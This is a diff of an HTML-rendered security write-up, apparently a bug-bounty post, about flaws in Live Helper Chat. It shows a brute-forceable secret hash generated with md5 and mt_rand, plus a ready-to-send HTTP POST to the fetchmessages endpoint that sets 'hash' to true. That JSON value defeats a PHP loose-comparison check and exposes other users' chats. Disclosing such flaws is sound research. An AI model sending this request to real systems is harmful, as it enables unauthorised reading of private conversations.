@@ -92,12 +92,10 @@
 <span class="nv">$cfgSite</span><span class="o">-&gt;</span><span class="na">setSetting</span><span class="p">(</span> <span class="s1">&#39;site&#39;</span><span class="p">,</span> <span class="s1">&#39;secrethash&#39;</span><span class="p">,</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">time</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;:&quot;</span> <span class="o">.</span> <span class="nb">mt_rand</span><span class="p">()),</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">));</span>
 </code></pre></div>
 
-
 <p>10 characters of only hexadecimal, making 16^10 possilibities ( 1.099.511.627.776 ), totally brute-forceable. Also, don't use mt_rand, it's pretty broken. You can get an sha1 of it on the captcha :</p>
 <div class="codehilite"><pre><span></span><code><span class="cp">&lt;?</span>
 <span class="nv">$hash</span> <span class="o">=</span> <span class="nb">sha1</span><span class="p">(</span><span class="nx">erLhcoreClassIPDetect</span><span class="o">::</span><span class="na">getIP</span><span class="p">()</span> <span class="o">.</span> <span class="nv">$Params</span><span class="p">[</span><span class="s1">&#39;user_parameters&#39;</span><span class="p">][</span><span class="s1">&#39;timets&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nx">erConfigClassLhConfig</span><span class="o">::</span><span class="na">getInstance</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getSetting</span><span class="p">(</span> <span class="s1">&#39;site&#39;</span><span class="p">,</span> <span class="s1">&#39;secrethash&#39;</span> <span class="p">));</span>
 </code></pre></div>
-
 
 <p>You know every argument but the hash, pass it to hashcat and profit.</p>
 <p>For bug bounty, trying to guess how hashes are generated is a valid strategy, better if you can reverse engineer it on a mobile app or some javascript, found a couple of bugs that way.</p>
@@ -107,12 +105,10 @@
     <span class="k">if</span> <span class="p">(</span><span class="nv">$chat</span> <span class="nx">instanceof</span> <span class="nx">erLhcoreClassModelChat</span> <span class="o">&amp;&amp;</span> <span class="nv">$chat</span><span class="o">-&gt;</span><span class="na">hash</span> <span class="o">==</span> <span class="nv">$requestPayload</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">])</span>
 </code></pre></div>
 
-
 <p>But it accepts JSON as input, oh no (ﾉಥ益ಥ)ﾉ</p>
 <div class="codehilite"><pre><span></span><code><span class="cp">&lt;?</span>
 <span class="nv">$requestPayload</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">),</span><span class="k">true</span><span class="p">);</span>
 </code></pre></div>
-
 
 <p>just replace it to true and bypass the check (づ｡◕‿‿◕｡)づ</p>
 <div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/eng/widgetrestapi/fetchmessages</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
@@ -134,15 +130,14 @@
 <span class="na">Accept-Language</span><span class="o">:</span> <span class="l">pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7</span>
 <span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
 
-{
-   &quot;chat_id&quot;:2,
-   &quot;hash&quot;:true,
-   &quot;lmgsid&quot;:1,
-   &quot;theme&quot;:1,
-   &quot;new_chat&quot;:true
-}
+<span class="err">{</span>
+<span class="err">   &quot;chat_id&quot;:2,</span>
+<span class="err">   &quot;hash&quot;:true,</span>
+<span class="err">   &quot;lmgsid&quot;:1,</span>
+<span class="err">   &quot;theme&quot;:1,</span>
+<span class="err">   &quot;new_chat&quot;:true</span>
+<span class="err">}</span>
 </code></pre></div>
-
 
 <p>Every time I see a JSON now I'll put a true somewhere.</p>
 <h2>Closing thoughts</h2>
